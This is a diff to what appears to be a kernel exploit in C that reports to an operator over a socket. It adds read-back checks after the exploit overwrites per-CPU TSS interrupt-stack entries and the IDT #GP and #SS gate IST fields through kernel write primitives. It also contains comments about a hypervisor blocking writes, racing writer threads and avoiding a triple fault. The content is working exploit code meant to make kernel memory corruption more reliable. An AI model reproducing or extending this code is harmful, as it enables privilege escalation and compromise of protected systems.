@@ -5885,6 +5885,44 @@ broad_done:
                 }
             }
         }
+
+        /* Verify TSS writes by reading back the values */
+        {
+            int idx = gp_ist_index - 1;
+            int verify_ok = 1;
+            for (int cpu = 0; cpu < num_cpus_found; cpu++) {
+                if (!ist_modified_percpu[cpu][idx]) continue;
+                uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
+                uint64_t readback = 0;
+                if (kernel_copyout(cpu_tss + 0x24 + idx * 8,
+                                   &readback, 8) == 0) {
+                    if (readback == ist_stack_top) {
+                        send_response(sock,
+                            "  CPU%d IST%d readback: 0x%lx ✓\n",
+                            cpu, gp_ist_index, readback);
+                    } else {
+                        send_response(sock,
+                            "  CPU%d IST%d readback: 0x%lx "
+                            "MISMATCH (expected 0x%lx) — "
+                            "HV may be blocking writes!\n",
+                            cpu, gp_ist_index, readback,
+                            ist_stack_top);
+                        verify_ok = 0;
+                    }
+                } else {
+                    send_response(sock,
+                        "  CPU%d IST%d readback FAILED\n",
+                        cpu, gp_ist_index);
+                    verify_ok = 0;
+                }
+            }
+            if (!verify_ok) {
+                send_response(sock,
+                    "  FATAL: TSS writes not verified — "
+                    "aborting to avoid triple fault\n");
+                goto step7_cleanup;
+            }
+        }
         send_response(sock, "  [DIAG] checkpoint 3: TSS writes done\n");
         usleep(5000);
 
@@ -5898,7 +5936,25 @@ broad_done:
             usleep(5000);
             kernel_setchar(idt_access + 13 * 16 + 4, new_byte);
             idt_gate_modified = 1;
-            send_response(sock, "  #GP gate IST -> 7\n");
+            /* Verify #GP gate write */
+            uint8_t gp_rb = 0;
+            if (kernel_copyout(idt_access + 13 * 16 + 4, &gp_rb, 1) == 0) {
+                if ((gp_rb & 0x07) == 7) {
+                    send_response(sock,
+                        "  #GP gate IST -> 7 (verified: 0x%02x)\n",
+                        gp_rb);
+                } else {
+                    send_response(sock,
+                        "  #GP gate write MISMATCH: read back "
+                        "0x%02x (IST=%d, expected 7) — "
+                        "HV blocking IDT writes!\n",
+                        gp_rb, gp_rb & 0x07);
+                    goto step7_cleanup;
+                }
+            } else {
+                send_response(sock,
+                    "  #GP gate readback failed\n");
+            }
         }
         if (ss_needs_patch) {
             uint8_t new_byte = (ss_gate_saved[4] & 0xF8) | 7;
@@ -5908,7 +5964,24 @@ broad_done:
             usleep(5000);
             kernel_setchar(idt_access + 12 * 16 + 4, new_byte);
             ss_gate_modified = 1;
-            send_response(sock, "  #SS gate IST -> 7\n");
+            /* Verify #SS gate write */
+            uint8_t ss_rb = 0;
+            if (kernel_copyout(idt_access + 12 * 16 + 4, &ss_rb, 1) == 0) {
+                if ((ss_rb & 0x07) == 7) {
+                    send_response(sock,
+                        "  #SS gate IST -> 7 (verified: 0x%02x)\n",
+                        ss_rb);
+                } else {
+                    send_response(sock,
+                        "  #SS gate write MISMATCH: read back "
+                        "0x%02x (IST=%d, expected 7)\n",
+                        ss_rb, ss_rb & 0x07);
+                    goto step7_cleanup;
+                }
+            } else {
+                send_response(sock,
+                    "  #SS gate readback failed\n");
+            }
         }
 
         /* Step 3: Start writer threads — multiple for better race odds */
